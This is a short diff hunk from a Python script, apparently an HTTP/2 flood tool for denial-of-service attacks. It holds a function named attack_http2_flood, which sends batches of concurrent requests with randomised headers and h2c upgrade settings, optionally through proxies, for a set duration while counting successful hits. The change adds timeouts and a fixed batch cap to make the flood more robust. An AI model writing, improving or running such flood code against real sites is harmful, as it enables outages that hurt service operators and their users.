@@ -1487,15 +1487,15 @@ async def attack_http2_flood(url: str, proxy: Optional[str], session_pool: Optim
                 headers = build_random_headers(dynamic_url, "GET")
                 headers["Upgrade"] = "h2c"
                 headers["HTTP2-Settings"] = "AAMAAABkAARAAAAAAAIAAAAA"
-                resp = await sess.get(dynamic_url, headers=headers, timeout=8)
+                resp = await asyncio.wait_for(sess.get(dynamic_url, headers=headers, timeout=8), timeout=12)
                 return resp.status_code
             except Exception:
                 return 0
 
         while time.time() - start < duration:
-            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
+            batch_size = min(max(target_rps, 10), 50)
             tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
+            results = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=20)
             for result in results:
                 metrics["total"] += 1
                 if isinstance(result, int) and result >= 200:
